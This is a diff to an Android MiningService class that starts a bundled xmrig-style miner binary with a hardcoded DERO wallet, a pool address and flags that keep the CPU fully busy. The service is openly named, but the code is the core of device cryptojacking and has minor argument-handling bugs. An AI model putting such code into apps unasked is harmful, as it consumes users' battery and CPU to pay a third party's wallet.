@@ -157,6 +157,7 @@ public class MiningService extends Service {
             // write the config
             // Tools.writeConfig(configTemplate, config.pool, config.username, config.threads, config.maxCpu, privatePath);
             // we'll get these from the config object after it's working
+            String appDir = this.getApplicationInfo().nativeLibraryDir;
             String wallet = "dERoQY3fRgQfG2HpErJ3R4YYBx4aPKF19LT5EnzVsTNZZDPFRvNz9VWG7owvJUiGqWjZ1btyDPT6DcgC4QKAQGsg9qWePwEsRc.20000";
             String max_bwt = "710";
             String pool = "us.hero.miner.us:1117";
@@ -165,22 +166,21 @@ public class MiningService extends Service {
                     "--huge-pages-jit=TRUE --asm=auto --cpu-memory-pool=-1 --cpu-no-yield --print-time=8"+
                     "--retry-pause=2";
             String args = String.format(config_template, pool, wallet, max_bwt);
-            String binary = "libpm.so";
-            fullPath = privatePath+"/"+binary;
-            ProcessBuilder pb = new ProcessBuilder(binary);
+            String[] pm = { "./libpm.so", args };
+            fullPath = privatePath+"/libpm.so";
+            ProcessBuilder pb = new ProcessBuilder( pm );
 
             //in our directory, which is
-            java.io.File dir = new java.io.File(privatePath+"/");
-            pb.directory(dir); // needs to be a file type
+            pb.directory(new File(appDir)); // needs to be a file type
 
             // with the directory as ld path so xmrig finds the libs
-            pb.environment().put("LD_LIBRARY_PATH", privatePath);
+            pb.environment().put("LD_LIBRARY_PATH", appDir);
             //in case of errors, read them
             pb.redirectErrorStream();
             accepted = 0;
             //run it!
             Process process = pb.start();   // how do we check if this worked?
-            //start processing xmrig's output    // so why not use pb.redirectOutput(); ?
+            //start processing miners output    // so why not use pb.redirectOutput(); ?
             outputHandler = new MiningService.OutputReaderThread(process.getInputStream());
             outputHandler.start();
             Toast.makeText(this, "started: ", Toast.LENGTH_SHORT).show();
